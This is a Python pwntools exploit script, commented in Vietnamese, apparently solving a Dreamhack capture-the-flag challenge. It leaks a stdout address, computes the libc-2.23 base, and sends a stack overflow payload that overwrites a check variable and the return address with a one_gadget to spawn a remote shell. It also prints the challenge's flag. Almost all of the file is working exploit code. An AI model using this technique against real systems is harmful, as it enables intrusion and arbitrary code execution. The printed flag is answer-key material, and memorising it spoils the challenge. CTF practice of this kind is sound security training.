from pwn import *

# --- Cấu hình ---
HOST = "host1.dreamhack.games"
PORT = 23864

# Kết nối tới server
p = remote(HOST, PORT)

# --- Các offset cho libc-2.23.so (Ubuntu 16.04) ---
LIBC_STDOUT_OFFSET = 0x3c5620
LIBC_ONE_GADGET_OFFSET = 0x45216 # Gadget với constraint: rax == NULL

# --- Bắt đầu khai thác ---

# 1. Nhận địa chỉ stdout bị leak từ chương trình
p.recvuntil(b"stdout: ")
leaked_stdout = int(p.recvline().strip(), 16)
log.info(f"Leaked stdout address: {hex(leaked_stdout)}")

# 2. Tính toán các địa chỉ cần thiết
libc_base = leaked_stdout - LIBC_STDOUT_OFFSET
one_gadget_addr = libc_base + LIBC_ONE_GADGET_OFFSET
log.info(f"Calculated libc base: {hex(libc_base)}")
log.info(f"Calculated one-gadget address: {hex(one_gadget_addr)}")

# 3. Xây dựng payload (ĐÃ SỬA LỖI)
# Cấu trúc: [Padding cho msg] + [Ghi đè 'check'] + [Padding] + [Ghi đè RBP] + [Địa chỉ one-gadget]
payload = b""
payload += b"A" * 24
payload += b'\x00' * 8
payload += b"B" * 8
payload += p64(one_gadget_addr)

log.info("Sending payload...")

# 4. Gửi payload
p.sendlineafter(b"MSG: ", payload)

print(p.recv())

# 5. Chuyển sang chế độ tương tác để nhận shell
log.success("Payload sent! Switching to interactive mode.")
p.interactive()

# Khi có shell, bạn có thể chạy lệnh `cat flag` hoặc `ls -la` để tìm flag.
# Flag: DH{a6e74f669acffd69602b76c81c0516b2}